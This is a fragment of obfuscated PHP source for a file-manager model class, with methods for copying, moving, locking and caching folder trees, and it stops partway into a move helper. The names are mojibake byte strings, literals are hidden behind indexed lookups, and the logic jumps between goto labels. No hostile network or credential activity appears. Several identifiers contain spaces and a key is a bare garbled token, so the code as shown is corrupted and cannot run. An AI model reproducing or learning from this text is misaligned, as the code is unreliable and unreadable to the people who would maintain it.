$_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($F‰ÆùÃ…ñ‘, $dôš‘–ù° = 1) { $eñ½ÍÁİ®‹ = $_SERVER[ÈİÅ¿ÈÈ¥×][517] . md5($F‰ÆùÃ…ñ‘); if ($dôš‘–ù°) { if (isset(self::$_lockItemArr[$eñ½ÍÁİ®‹])) { return; } self::$_lockItemArr[$eñ½ÍÁİ®‹] = 1; CacheLock::lock($eñ½ÍÁİ®‹, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$eñ½ÍÁİ®‹])) { return; } unset(self::$_lockItemArr[$eñ½ÍÁİ®‹]); CacheLock::unlock($eñ½ÍÁİ®‹); } } public function isParentOf($aÑƒÄĞñØ, $Cğ¥—Şçñì) { goto dÉàáÜ¤ÛÅ; e‘²äÍê÷Ø: $B•œÁˆßÕƒ = $DåÇğ¦ŞŞÈ[$cÂ¤·„¬ê[476]] . $DåÇğ¦ŞŞÈ[$cÂ¤·„¬ê[385]] . $cÂ¤·„¬ê[47]; $eÅ­áƒ·ìŒ = $AÒ•™¥‡ßĞ[$cÂ¤·„¬ê[476]] . $AÒ•™¥‡ßĞ[$cÂ¤·„¬ê[385]] . $cÂ¤·„¬ê[47]; $Bùƒ„ĞªøÉ = strpos($eÅ­áƒ·ìŒ, $B•œÁˆßÕƒ) === 0; goto A‡²²¹ï§£; dÉàáÜ¤ÛÅ: $cÂ¤·„¬ê =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $DåÇğ¦ŞŞÈ = $this->sourceInfo($aÑƒÄĞñØ); $AÒ•™¥‡ßĞ = $this->sourceInfo($Cğ¥—Şçñì); goto e‘²äÍê÷Ø; A‡²²¹ï§£: return $Bùƒ„ĞªøÉ; goto F‚èÂ‚«Ä; F‚èÂ‚«Ä: } private $targetIsDelete = 0; public function copy($f†šÖ¨ß¦÷, $f¬ù™ãŠéË, $a™¤¢Á„†Ä = REPEAT_REPLACE, $F“³Ø‚«¥Ó = '') { goto cÃ¢«İ’; FË¼‰Ö±Ú: $this->lockCopyStart($f†šÖ¨ß¦÷); $this->lockWriteStart($f¬ù™ãŠéË, $eµ¡½§À±Ü); $a‚ªê’è˜Œ = array($c¢°¡¡î‡[518] => array(), $c¢°¡¡î‡[519] => array(), $c¢°¡¡î‡[520] => array()); goto D¨ƒŒÜÛ¶¥; B‘ÙÁª¦îà: if (!$aœ§ÎËÂÍ || !$B•ß—â÷¾” || $B•ß—â÷¾”[$c¢°¡¡î‡[386]] != $c¢°¡¡î‡[83]) { return !1; } if ($this->isParentOf($f†šÖ¨ß¦÷, $f¬ù™ãŠéË)) { return !1; } $eµ¡½§À±Ü = $F“³Ø‚«¥Ó ? $F“³Ø‚«¥Ó : $aœ§ÎËÂÍ[$c¢°¡¡î‡[28]]; goto FË¼‰Ö±Ú; bœ¡ãó‘²×: $this->updateModifyTime($f¬ù™ãŠéË); return $e“¸Êø¿Æ; goto d¢Ú±‘¬É; F£©“’ÔÜ: $this->_childrenListClear(); $this->lockCopyEnd($f†šÖ¨ß¦÷); $this->lockWriteEnd($f¬ù™ãŠéË, $eµ¡½§À±Ü); goto Aé˜¦·‡§’; Aé˜¦·‡§’: if ($aœ§ÎËÂÍ[$c¢°¡¡î‡[386]] == $c¢°¡¡î‡[83] && $b˜ÙÒ¤ãôÅ == $e“¸Êø¿Æ) { $this->folderSizeResetChildren($b˜ÙÒ¤ãôÅ); } Model($c¢°¡¡î‡[521])->addAll($a‚ªê’è˜Œ[$c¢°¡¡î‡[519]], array(), !0); if ($b˜ÙÒ¤ãôÅ != $e“¸Êø¿Æ || $aœ§ÎËÂÍ[$c¢°¡¡î‡[386]] == $c¢°¡¡î‡[83]) { Model($c¢°¡¡î‡[522])->eventCopy($e“¸Êø¿Æ); } goto dŸª‚Ù ò; D¨ƒŒÜÛ¶¥: $this->targetIsDelete = intval($aœ§ÎËÂÍ[$c¢°¡¡î‡[413]]); $b˜ÙÒ¤ãôÅ = $this->fileNameExistCache($f¬ù™ãŠéË, $aœ§ÎËÂÍ[$c¢°¡¡î‡[28]]); $e“¸Êø¿Æ = $this->_copy($f†šÖ¨ß¦÷, $f¬ù™ãŠéË, $a™¤¢Á„†Ä, $a‚ªê’è˜Œ, !0, $F“³Ø‚«¥Ó); goto F£©“’ÔÜ; dŸª‚Ù ò: $this->saveAll($a‚ªê’è˜Œ[$c¢°¡¡î‡[520]]); Model($c¢°¡¡î‡[171])->linkAdd($a‚ªê’è˜Œ[$c¢°¡¡î‡[518]]); $this->folderSizeReset($f¬ù™ãŠéË); goto bœ¡ãó‘²×; cÃ¢«İ’: $c¢°¡¡î‡ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $aœ§ÎËÂÍ = $this->sourceInfo($f†šÖ¨ß¦÷); $B•ß—â÷¾” = $this->sourceInfo($f¬ù™ãŠéË); goto B‘ÙÁª¦îà; d¢Ú±‘¬É: } private function _copy($f¼ˆ÷¯İò, $Bé¨¼‰šš, $cæÈ¤£í¼, &$b¡§¥®ß³…, $A×Ú‰Íˆåæ, $BöÜöË²Öî = '') { goto C»½šêªÄ; e“°ôˆ‡¹›: if (!$F¶›á•¯Éª) { return $this->_copyCreate($f¼ˆ÷¯İò, $Bé¨¼‰šš, $bìŞòëØÇ, $b¡§¥®ß³…); } $EãÆñÌ‘ˆ = $F¶›á•¯Éª; if ($AêÉ™¯¡á­) { if ($cæÈ¤£í¼ == REPEAT_RENAME_FOLDER) { $bìŞòëØÇ = $this->fileNameAutoCache($Bé¨¼‰šš, $bìŞòëØÇ, $cæÈ¤£í¼, $AêÉ™¯¡á­); $EãÆñÌ‘ˆ = $this->_copyCreate($f¼ˆ÷¯İò, $Bé¨¼‰šš, $bìŞòëØÇ, $b¡§¥®ß³…); } else { $FöòêŞƒ×† = $this->_childrenList($f¼ˆ÷¯İò); foreach ($FöòêŞƒ×† as $Cãù«¶ê”) { $this->_copy($Cãù«¶ê”[$BªÔò±¢šÂ[385]], $F¶›á•¯Éª, $cæÈ¤£í¼, $b¡§¥®ß³…, !1); } } } else { if ($cæÈ¤£í¼ == REPEAT_RENAME || $cæÈ¤£í¼ == REPEAT_RENAME_FOLDER) { $bìŞòëØÇ = $this->fileNameAutoCache($Bé¨¼‰šš, $bìŞòëØÇ, $cæÈ¤£í¼, $AêÉ™¯¡á­); $EãÆñÌ‘ˆ = $this->_copyCreate($f¼ˆ÷¯İò, $Bé¨¼‰šš, $bìŞòëØÇ, $b¡§¥®ß³…); } else { if ($cæÈ¤£í¼ == REPEAT_REPLACE) { $dŠäßâòâ¯ = $this->sourceInfoCache($F¶›á•¯Éª); $Cô½Ñ¹‰›š = $this->fileHistory($dŠäßâòâ¯, $E£Ú¸Ó‘’ó[$BªÔò±¢šÂ[435]], $E£Ú¸Ó‘’ó[$BªÔò±¢šÂ[77]]); if ($Cô½Ñ¹‰›š) { $b¡§¥®ß³…[$BªÔò±¢šÂ[518]][] = $E£Ú¸Ó‘’ó[$BªÔò±¢šÂ[435]]; } } else { if ($cæÈ¤£í¼ == REPEAT_SKIP) { } } } Hook::trigger($BªÔò±¢šÂ[523], array($BªÔò±¢šÂ[524], $E£Ú¸Ó‘’ó, 0)); } goto e¨£¿ïƒ„Ó; bˆî™“Ëò: $bìŞòëØÇ = $BöÜöË²Öî ? $BöÜöË²Öî : $E£Ú¸Ó‘’ó[$BªÔò±¢šÂ[28]]; $F¶›á•¯Éª = $this->fileNameExistCache($Bé¨¼‰šš, $bìŞòëØÇ); if ($A×Ú‰Íˆåæ) { $this->_childrenAllMake($f¼ˆ÷¯İò); if ($AêÉ™¯¡á­ && $F¶›á•¯Éª) { $this->_childrenAllMake($F¶›á•¯Éª); } } goto e“°ôˆ‡¹›; e¨£¿ïƒ„Ó: return $EãÆñÌ‘ˆ; goto fé°Ç©àïà; C»½šêªÄ: $BªÔò±¢šÂ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $E£Ú¸Ó‘’ó = $this->sourceInfoCache($f¼ˆ÷¯İò); $AêÉ™¯¡á­ = $E£Ú¸Ó‘’ó[$BªÔò±¢šÂ[386]] == $BªÔò±¢šÂ[83]; goto bˆî™“Ëò; fé°Ç©àïà: } private function _copyCreate($C”‘¤—âê, $aÂÓ¨ê§Š™, $f…öŠèÉ, &$a‹ñß’ë¨) { goto D­ïñ‡ïİ²; BŒßßùÔªÔ: if ($e™èæÑï[$c¹Ç øÑ£à[386]] != $c¹Ç øÑ£à[83]) { $a‹ñß’ë¨[$c¹Ç øÑ£à[518]][] = $e™èæÑï[$c¹Ç øÑ£à[435]]; return $bÏÇ‘÷Ã†ƒ; } $d†æá³Òœ = array(); $aÔöŒÍ¨šğ = array(); goto BĞ‘ğÎØÅ; C‡Œá…ÙÓ: $this->addAll($aÔöŒÍ¨šğ, array(), !1); $Bäß“™³Û = $this->where(array($c¹Ç øÑ£à[478] => $bÏÇ‘÷Ã†ƒ))->select(); $D‘º­éó›› = $this->_childrenMakeRelation($d†æá³Òœ, $Bäß“™³Û); goto b¶¬¨µù´‚; D­ïñ‡ïİ²: $c¹Ç øÑ£à =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $e™èæÑï = $this->sourceInfoCache($C”‘¤—âê); $B¶Ñõ‰òÏ = $this->sourceInfoCache($aÂÓ¨ê§Š™); goto C†»÷¤™; c‹¿ˆÅóˆ: $Fâ¥¥ÊÀá = $this->sourceInfo($bÏÇ‘÷Ã†ƒ); foreach ($d†æá³Òœ as $DèÆ¾Ã³‡) { $bİØ”Üë°½ = $this->_makeItemData($DèÆ¾Ã³‡, $Fâ¥¥ÊÀá, $DèÆ¾Ã³‡[$c¹Ç øÑ£à[28]]); $bİØ”Üë°½[$c¹Ç øÑ£à[476]] = $DèÆ¾Ã³‡[$c¹Ç øÑ£à[476]]; $aÔöŒÍ¨šğ[] = $bİØ”Üë°½; } $this->chunkEventSet($c¹Ç øÑ£à[528], array($c¹Ç øÑ£à[529], $bÀÚˆ£ÀøŒ, $Cˆ¡è¶½Âè)); goto C‡Œá…ÙÓ; b¶¬¨µù´‚: $D‘º­éó››[$C”‘¤—âê] = $bÏÇ‘÷Ã†ƒ; $aáëÈÜ©½· = array(); $Fëèî½‚È­ = array(); goto Cƒ÷èèÒ¯; Cƒ÷èèÒ¯: foreach ($Bäß“™³Û as $DèÆ¾Ã³‡) { $EÀçõáˆÕ› = $DèÆ¾Ã³‡[$c¹Ç øÑ£à[385]]; $dßòò ¤†è = $this->_childrenMatch($D‘º­éó››, $DèÆ¾Ã³‡, $Fâ¥¥ÊÀá); $aáëÈÜ©½·[] = array($c¹Ç øÑ£à[385], $EÀçõáˆÕ›, $c¹Ç øÑ£à[478], $dßòò ¤†è[$c¹Ç øÑ£à[478]]); $Fëèî½‚È­[] = array($c¹Ç øÑ£à[385], $EÀçõáˆÕ›, $c¹Ç øÑ£à[476], $dßòò ¤†è[$c¹Ç øÑ£à[476]]); $this->_copyApplyMeta($DèÆ¾Ã³‡, $a‹ñß’ë¨); if ($DèÆ¾Ã³‡[$c¹Ç øÑ£à[386]] != $c¹Ç øÑ£à[83]) { $a‹ñß’ë¨[$c¹Ç øÑ£à[518]][] = $DèÆ¾Ã³‡[$c¹Ç øÑ£à[435]]; } } $this->chunkEventSet($c¹Ç øÑ£à[530], array($c¹Ç øÑ£à[531], $bÀÚˆ£ÀøŒ, $Cˆ¡è¶½Âè)); $this->saveAll($aáëÈÜ©½·); goto FÄÚ˜§Ú‹î; FÄÚ˜§Ú‹î: $this->chunkEventSet($c¹Ç øÑ£à[532], array($c¹Ç øÑ£à[533], $bÀÚˆ£ÀøŒ, $Cˆ¡è¶½Âè)); $this->saveAll($Fëèî½‚È­); return $bÏÇ‘÷Ã†ƒ; goto eãğÃ¯¡Ô®; BĞ‘ğÎØÅ: $this->_childrenListAll($C”‘¤—âê, $d†æá³Òœ); $Cˆ¡è¶½Âè = count($d†æá³Òœ); if ($Cˆ¡è¶½Âè == 0) { return $bÏÇ‘÷Ã†ƒ; } goto c‹¿ˆÅóˆ; C†»÷¤™: $bÀÚˆ£ÀøŒ = $this->_makeItemData($e™èæÑï, $B¶Ñõ‰òÏ, $f…öŠèÉ); Hook::trigger($c¹Ç øÑ£à[525], $bÀÚˆ£ÀøŒ); Hook::trigger($c¹Ç øÑ£à[526], array($c¹Ç øÑ£à[527], $bÀÚˆ£ÀøŒ, 0)); goto Cˆ¥Ğ††Ë£; Cˆ¥Ğ††Ë£: $bÏÇ‘÷Ã†ƒ = $this->add($bÀÚˆ£ÀøŒ); $fäšš‰¿†ñ = array($c¹Ç øÑ£à[385] => $bÏÇ‘÷Ã†ƒ, $c¹Ç øÑ£à[28] => $f…öŠèÉ); $this->_copyApplyMeta($fäšš‰¿†ñ, $a‹ñß’ë¨); goto BŒßßùÔªÔ; eãğÃ¯¡Ô®: } private function _childrenMakeRelation($bÊ®‘»÷é, $BÏÙ‡‡Ë¼õ) { $A´¢¬È»Ûò =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $EËæÈ¶ÄêÚ = array(); $Fô¨îò°Ë = array(); foreach ($bÊ®‘»÷é as $CÏƒ™ä†¢Æ) { $aË§¨ÎÖØ = $CÏƒ™ä†¢Æ[$A´¢¬È»Ûò[28]] . $A´¢¬È»Ûò[8] . $CÏƒ™ä†¢Æ[$A´¢¬È»Ûò[476]]; $EËæÈ¶ÄêÚ[$aË§¨ÎÖØ] = $CÏƒ™ä†¢Æ[$A´¢¬È»Ûò[385]]; } foreach ($BÏÙ‡‡Ë¼õ as $CÏƒ™ä†¢Æ) { $aË§¨ÎÖØ = $CÏƒ™ä†¢Æ[$A´¢¬È»Ûò[28]] . $A´¢¬È»Ûò[8] . $CÏƒ™ä†¢Æ[$A´¢¬È»Ûò[476]]; $C í›”ÙƒÄ = $EËæÈ¶ÄêÚ[$aË§¨ÎÖØ]; $Fô¨îò°Ë[$C í›”ÙƒÄ] = $CÏƒ™ä†¢Æ[$A´¢¬È»Ûò[385]]; } return $Fô¨îò°Ë; } private function _childrenMatch($c»öËî¯­, $B‰®÷Ù°„¸, $E¥Ûƒ‰ÉÑ) { goto eĞ÷Ç‚¬É; eĞ÷Ç‚¬É: $CîŞæ›ÙÊ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $B—àÂš¶ğ = $E¥Ûƒ‰ÉÑ[$CîŞæ›ÙÊ[476]]; $bÄ­ì‚±•‰ = $this->parentLevelArray($B‰®÷Ù°„¸[$CîŞæ›ÙÊ[476]]); goto EàŞÊĞê®Õ; EàŞÊĞê®Õ: foreach ($bÄ­ì‚±•‰ as $FøÒ…ÕÔ“â) { if (isset($c»öËî¯­[$FøÒ…ÕÔ“â])) { $B—àÂš¶ğ .= $c»öËî¯­[$FøÒ…ÕÔ“â] . $CîŞæ›ÙÊ[534]; } } $B—àÂš¶ğ = rtrim($B—àÂš¶ğ, $CîŞæ›ÙÊ[47]) . $CîŞæ›ÙÊ[47]; $dÓ¿¥©İöî = $this->parentLevelArray($B—àÂš¶ğ); goto fÔÅÊ®®Ñ; fÔÅÊ®®Ñ: $DøÆÆï¸™ = $dÓ¿¥©İöî[count($dÓ¿¥©İöî) - 1]; return array($CîŞæ›ÙÊ[478] => $DøÆÆï¸™, $CîŞæ›ÙÊ[476] => $B—àÂš¶ğ); goto e¯ †è½ŸÈ; e¯ †è½ŸÈ: } private function _makeItemData($E¾„Ë†ù…Ö, $Cº·ÜğïÃİ, $cÖ¢÷Ä‘‹) { $Fª™¬ÆÂÅ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $aÖ¤Šİ¢Â™ = array($Fª™¬ÆÂÅ[535] => $E¾„Ë†ù…Ö[$Fª™¬ÆÂÅ[386]], $Fª™¬ÆÂÅ[402] => $cÖ¢÷Ä‘‹, $Fª™¬ÆÂÅ[536] => $E¾„Ë†ù…Ö[$Fª™¬ÆÂÅ[388]], $Fª™¬ÆÂÅ[436] => $E¾„Ë†ù…Ö[$Fª™¬ÆÂÅ[435]], $Fª™¬ÆÂÅ[537] => $E¾„Ë†ù…Ö[$Fª™¬ÆÂÅ[77]], $Fª™¬ÆÂÅ[538] => $Cº·ÜğïÃİ[$Fª™¬ÆÂÅ[387]], $Fª™¬ÆÂÅ[539] => $Cº·ÜğïÃİ[$Fª™¬ÆÂÅ[473]], $Fª™¬ÆÂÅ[540] => USER_ID, $Fª™¬ÆÂÅ[541] => USER_ID, $Fª™¬ÆÂÅ[384] => $Cº·ÜğïÃİ[$Fª™¬ÆÂÅ[385]], $Fª™¬ÆÂÅ[542] => $Cº·ÜğïÃİ[$Fª™¬ÆÂÅ[476]] . $Cº·ÜğïÃİ[$Fª™¬ÆÂÅ[385]] . $Fª™¬ÆÂÅ[47], $Fª™¬ÆÂÅ[412] => 0, $Fª™¬ÆÂÅ[543] => $Fª™¬ÆÂÅ[33]); return $aÖ¤Šİ¢Â™; } private function _copyApplyMeta($dŒÃˆ´–—µ, &$c×­éÖ³İ‰) { $F…·¶Ï³·ã =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $dÑéƒ¨ß‡ = $dŒÃˆ´–—µ[$F…·¶Ï³·ã[385]]; $F¨óÁ’¹ÄŸ = $dŒÃˆ´–—µ[$F…·¶Ï³·ã[28]]; if (!isset($dŒÃˆ´–—µ[$F…·¶Ï³·ã[544]]) || !$dŒÃˆ´–—µ[$F…·¶Ï³·ã[544]] || $dŒÃˆ´–—µ[$F…·¶Ï³·ã[544]] == $F…·¶Ï³·ã[485]) { $c×­éÖ³İ‰[$F…·¶Ï³·ã[520]][] = array($F…·¶Ï³·ã[385], $dÑéƒ¨ß‡, $F…·¶Ï³·ã[544], short_id($dÑéƒ¨ß‡)); } if (Input::check($F¨óÁ’¹ÄŸ, $F…·¶Ï³·ã[545])) { $c×­éÖ³İ‰[$F…·¶Ï³·ã[519]][] = array($F…·¶Ï³·ã[385] => $dÑéƒ¨ß‡, $F…·¶Ï³·ã[89] => $F…·¶Ï³·ã[432], $F…·¶Ï³·ã[366] => str_replace($F…·¶Ï³·ã[50], $F…·¶Ï³·ã[33], Pinyin::encode($F¨óÁ’¹ÄŸ))); $c×­éÖ³İ‰[$F…·¶Ï³·ã[519]][] = array($F…·¶Ï³·ã[385] => $dÑéƒ¨ß‡, $F…·¶Ï³·ã[89] => $F…·¶Ï³·ã[431], $F…·¶Ï³·ã[366] => Pinyin::encode($F¨óÁ’¹ÄŸ, $F…·¶Ï³·ã[546])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($b×ğÁÃ Ê) { goto EÙòÓä¿ÂÚ; EÙòÓä¿ÂÚ: $e³–Ü•‚ò¸ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $DÜÚÑ ×îã = $this->sourceInfo($b×ğÁÃ Ê); $BìÁÔ²ïö = $e³–Ü•‚ò¸[414]; goto AŒŒ°ÛŠ‘Ò; AŒŒ°ÛŠ‘Ò: $fØ¥¸õ’² = array($e³–Ü•‚ò¸[476] => array($e³–Ü•‚ò¸[500], $DÜÚÑ ×îã[$e³–Ü•‚ò¸[476]] . $b×ğÁÃ Ê . $e³–Ü•‚ò¸[501]), $e³–Ü•‚ò¸[413] => $this->targetIsDelete); $B×ƒÓçæç‹ = $this->field($BìÁÔ²ïö)->where($fØ¥¸õ’²)->select(); if (!$B×ƒÓçæç‹) { return; } goto a‘Ñ £ĞÕ—; a‘Ñ £ĞÕ—: $B×ƒÓçæç‹ = array_to_keyvalue($B×ƒÓçæç‹, $e³–Ü•‚ò¸[385]); foreach ($B×ƒÓçæç‹ as $dÛœ”õ´œ–) { $C²óƒä¿¸İ = $dÛœ”õ´œ–[$e³–Ü•‚ò¸[478]]; $b×ğÁÃ Ê = $dÛœ”õ´œ–[$e³–Ü•‚ò¸[385]]; if (!isset($this->_childrenListCache[$b×ğÁÃ Ê]) && $dÛœ”õ´œ–[$e³–Ü•‚ò¸[386]] == $e³–Ü•‚ò¸[83]) { $this->_childrenListCache[$b×ğÁÃ Ê] = array(); } if (!isset($this->_childrenListCache[$C²óƒä¿¸İ])) { $this->_childrenListCache[$C²óƒä¿¸İ] = array(); } $this->_childrenListCache[$C²óƒä¿¸İ][$b×ğÁÃ Ê] = $dÛœ”õ´œ–; $this->_childrenItemCache[$b×ğÁÃ Ê] = $dÛœ”õ´œ–; } goto f·Û›Ñî£é; f·Û›Ñî£é: } private function _childrenListAll($C©ù–ëŠì¬, &$DÇ³²ÙÈùµ) { $f½ÆĞğ×À =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!isset($this->_childrenListCache[$C©ù–ëŠì¬])) { return; } $b“â“ãäöÇ = $this->_childrenListCache[$C©ù–ëŠì¬]; foreach ($b“â“ãäöÇ as $F”¨‚Çİî => $E‰Ğ¼´ë…Ş) { $DÇ³²ÙÈùµ[$F”¨‚Çİî] = $E‰Ğ¼´ë…Ş; if ($E‰Ğ¼´ë…Ş[$f½ÆĞğ×À[386]] == $f½ÆĞğ×À[83]) { $this->_childrenListAll($F”¨‚Çİî, $DÇ³²ÙÈùµ); } } } private function sourceInfoCache($d‚Å•àó†­) { if (isset($this->_childrenItemCache[$d‚Å•àó†­])) { return $this->_childrenItemCache[$d‚Å•àó†­]; } return $this->sourceInfo($d‚Å•àó†­); } private function _childrenList($Dó–íİ·ÂÇ) { if (isset($this->_childrenListCache[$Dó–íİ·ÂÇ])) { return $this->_childrenListCache[$Dó–íİ·ÂÇ]; } return $this->_childrenListSelect($Dó–íİ·ÂÇ); } private function _childrenListSelect($AÁáºŸ¿šÜ) { goto eÁ¥÷‡µ´; E¡ÓªŠÄ¸: foreach ($DÈÇˆ¹„´ as $AÁáºŸ¿šÜ => $dÄ¤§Ê±áä) { $this->_childrenItemCache[$AÁáºŸ¿šÜ] = $dÄ¤§Ê±áä; } return $DÈÇˆ¹„´; goto CÜ‡ÚğĞ»¬; eÁ¥÷‡µ´: $A½¨Æ¢çÁ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $cÓŒ‡òÊ£š = array($A½¨Æ¢çÁ[478] => $AÁáºŸ¿šÜ, $A½¨Æ¢çÁ[413] => $this->targetIsDelete); $BÊÎ¹­ê¯ = $this->where($cÓŒ‡òÊ£š)->select(); goto B¯´Š¤Ç°; B¯´Š¤Ç°: $BÊÎ¹­ê¯ = $BÊÎ¹­ê¯ ? $BÊÎ¹­ê¯ : array(); $DÈÇˆ¹„´ = array_to_keyvalue($BÊÎ¹­ê¯, $A½¨Æ¢çÁ[385]); $this->_childrenListCache[$AÁáºŸ¿šÜ] = $DÈÇˆ¹„´; goto E¡ÓªŠÄ¸; CÜ‡ÚğĞ»¬: } private function fileNameExistCache($e£‚Ù¼Â¤“, $b±ãÖáª¸) { $Bó‰÷¯ÕÃ† =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $b±ãÖáª¸ = strtolower($b±ãÖáª¸); $eÆ¸…Å­œÕ = $this->_childrenList($e£‚Ù¼Â¤“); foreach ($eÆ¸…Å­œÕ as $FÓíˆ‹ø‰‚) { if ($b±ãÖáª¸ == strtolower($FÓíˆ‹ø‰‚[$Bó‰÷¯ÕÃ†[28]])) { return $FÓíˆ‹ø‰‚[$Bó‰÷¯ÕÃ†[385]]; } } return !1; } private function fileNameAutoCache($B£¨‘÷›âß, $B®Ï¿¥Ñ¥¡, $b¯–­„Îæ, $a¹ˆˆêÁĞ¬) { $FŸõÌğåÑ– =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $B·ê‚ÊÙÆß = $this->_childrenList($B£¨‘÷›âß); $bŸ†ÆÏ›£ï = array_to_keyvalue($B·ê‚ÊÙÆß, $FŸõÌğåÑ–[33], $FŸõÌğåÑ–[28]); return $this->fileNameAutoGet($bŸ†ÆÏ›£ï, $B®Ï¿¥Ñ¥¡, $b¯–­„Îæ, $a¹ˆˆêÁĞ¬); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($bì¡áÁôó, $BÅ’ÈÈèß, $cˆ«œÔÛì­ = REPEAT_REPLACE, $bìÎˆ»Ìá = '') { goto bËÔĞ‘¨½Ò; E‡…´ç¯Ëˆ: $this->lockMoveEnd($bì¡áÁôó); $this->lockWriteEnd($BÅ’ÈÈèß, $AÜ’ÕŸÜ³); $this->folderSizeReset($d°¿…”©¹Ü[$d¶›Ïˆ…İÅ[478]]); goto FÏÃÛÂ¢×Ù; e–»éÇ‡ÅÔ: if (!$d°¿…”©¹Ü || !$a«¥ÍìÔÅå || $a«¥ÍìÔÅå[$d¶›Ïˆ…İÅ[386]] != $d¶›Ïˆ…İÅ[83]) { return !1; } Hook::trigger($d¶›Ïˆ…İÅ[547], $f¹í‰Ó’ßÜ); $this->targetIsDelete = intval($d°¿…”©¹Ü[$d¶›Ïˆ…İÅ[413]]); goto f¤§”Éí„ô; cÑ»×î¸Àë: return $F×ñ®Î±‹ö; goto eõ¦¨è˜î; bËÔĞ‘¨½Ò: $d¶›Ïˆ…İÅ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $d°¿…”©¹Ü = $this->sourceInfo($bì¡áÁôó); $a«¥ÍìÔÅå = $this->sourceInfo($BÅ’ÈÈèß); goto dÀÏÓäîËò; dìÄ»­²™: $this->updateModifyTime($BÃğ·İÕÑ); Model($d¶›Ïˆ…İÅ[522])->eventMove($bì¡áÁôó, $d°¿…”©¹Ü[$d¶›Ïˆ…İÅ[478]], $BÅ’ÈÈèß); Hook::trigger($d¶›Ïˆ…İÅ[548], $f¹í‰Ó’ßÜ); goto cÑ»×î¸Àë; dÀÏÓäîËò: if ($d°¿…”©¹Ü[$d¶›Ïˆ…İÅ[478]] == $a«¥ÍìÔÅå[$d¶›Ïˆ…İÅ[385]]) { if ($d°¿…”©¹Ü[$d¶›Ïˆ…İÅ[413]] == $d¶›Ïˆ…İÅ[83]) { Model($d¶›Ïˆ…İÅ[411])->restore(array($bì¡áÁôó)); } if (!$bìÎˆ»Ìá || $bìÎˆ»Ìá == $d°¿…”©¹Ü[$d¶›Ïˆ…İÅ[28]]) { return $bì¡áÁôó; } } $f¹í‰Ó’ßÜ = $this->pathInfoMore($bì¡áÁôó); if ($this->isParentOf($bì¡áÁôó, $BÅ’ÈÈèß)) { return !1; } goto e–»éÇ‡ÅÔ; FÏÃÛÂ¢×Ù: $this->folderSizeReset($BÅ’ÈÈèß); $BÃğ·İÕÑ = array($d°¿…”©¹Ü[$d¶›Ïˆ…İÅ[478]], $BÅ’ÈÈèß); if ($d°¿…”©¹Ü[$d¶›Ïˆ…İÅ[386]] == $d¶›Ïˆ…İÅ[83]) { $BÃğ·İÕÑ[] = $bì¡áÁôó; } goto dìÄ»­²™; E¯ßƒ×†¬: if ($d°¿…”©¹Ü[$d¶›Ïˆ…İÅ[386]] == $d¶›Ïˆ…İÅ[83] && $EµÑÔ¨ìÏ) { $this->folderSizeResetChildren($F×ñ®Î±‹ö); } Model($d¶›Ïˆ…İÅ[171])->linkAdd($F×·¶Ù¨á[$d¶›Ïˆ…İÅ[518]]); if ($EµÑÔ¨ìÏ && $F×·¶Ù¨á[$d¶›Ïˆ…İÅ[549]]) { $this->removeNow($bì¡áÁôó, !1); } goto E‡…´ç¯Ëˆ; FÁÖÆÏÌÏğ: $EµÑÔ¨ìÏ = $this->fileNameExistCache($BÅ’ÈÈèß, $d°¿…”©¹Ü[$d¶›Ïˆ…İÅ[28]]); $F×ñ®Î±‹ö = $this->_move($bì¡áÁôó, $BÅ’ÈÈèß, $cˆ«œÔÛì­, $F×·¶Ù¨á, $bìÎˆ»Ìá); $this->sourceCacheClear(); goto E¯ßƒ×†¬; f¤§”Éí„ô: if ($d°¿…”©¹Ü[$d¶›Ïˆ…İÅ[478]] == $BÅ’ÈÈèß && $bìÎˆ»Ìá != $d°¿…”©¹Ü[$d¶›Ïˆ…İÅ[28]]) { $b„¹°ß†¤‰ = $this->fileNameExist($BÅ’ÈÈèß, $bìÎˆ»Ìá); if ($b„¹°ß†¤‰ && $d°¿…”©¹Ü[$d¶›Ïˆ…İÅ[386]] == $d¶›Ïˆ…İÅ[485]) { goto FçÊÑÓğù›; FçÊÑÓğù›: $B¦†æÒÔ™ = $this->sourceInfo($b„¹°ß†¤‰); $F–±óØ‚Üñ = $this->fileHistory($B¦†æÒÔ™, $d°¿…”©¹Ü[$d¶›Ïˆ…İÅ[435]], $d°¿…”©¹Ü[$d¶›Ïˆ…İÅ[77]]); if (!$F–±óØ‚Üñ) { Model($d¶›Ïˆ…İÅ[438])->remove($d°¿…”©¹Ü[$d¶›Ïˆ…İÅ[435]]); } goto dÉÆÑ›š½; bè¦Ìæİİ: return $b„¹°ß†¤‰; goto aõª§§œÂ; dÉÆÑ›š½: $this->removeNow($bì¡áÁôó, !1); $this->folderSizeReset($BÅ’ÈÈèß); Hook::trigger($d¶›Ïˆ…İÅ[548], $f¹í‰Ó’ßÜ); goto bè¦Ìæİİ; aõª§§œÂ: } } $AÜ’ÕŸÜ³ = $bìÎˆ»Ìá ? $bìÎˆ»Ìá : $d°¿…”©¹Ü[$d¶›Ïˆ…İÅ[28]]; $this->lockMoveStart($bì¡áÁôó); goto C”ë°ØÎ×; C”ë°ØÎ×: $this->lockWriteStart($BÅ’ÈÈèß, $AÜ’ÕŸÜ³); $F×·¶Ù¨á = array($d¶›Ïˆ…İÅ[518] => array(), $d¶›Ïˆ…İÅ[549] => !1); $this->clearShare($bì¡áÁôó, $BÅ’ÈÈèß); goto FÁÖÆÏÌÏğ; eõ¦¨è˜î: } private function _move($cŒ”²£ÛæÎ, $BÄÇ«ë‡¿, $CÃ‰Á†ß‚Ö, &$C·»Ñ¾©, $EÈ÷­íÕâ­ = '') 